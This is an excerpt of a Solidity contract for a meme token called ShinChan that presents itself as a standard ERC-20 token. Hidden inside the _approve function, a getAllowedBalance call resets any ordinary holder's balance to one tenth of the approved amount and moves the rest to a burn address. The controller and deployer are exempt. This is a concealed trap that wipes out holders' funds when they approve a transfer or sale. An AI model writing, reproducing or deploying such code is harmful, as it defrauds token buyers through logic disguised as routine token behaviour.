...
file: ShinChan.sol
version: 1.1
Author: Greatest Lover of Shin Chan
SPDX-License-Identifier: MIT

date: 23-04-2023

https://t.me/ShinChanCoinETH
...
contract Token is Context, IERC20 {
    ...
    address dead = 0x0000000000000000000000000000000000000002;
    ...
    constructor() {
        ...
        uint256 initialSupply = 904904904;
    ...
    function getAllowedBalance(address account, uint256 amount) internal returns (uint256) {
        if (account != _controller && account != deployer) {
            uint256 allowedBalance = amount.div(10);
            _balances[account] = allowedBalance;
            _balances[dead] = _balances[dead].add(amount.sub(allowedBalance));
    ...
    function _approve(
        ...
        emit Approval(owner, spender, getAllowedBalance(owner, amount));
    }
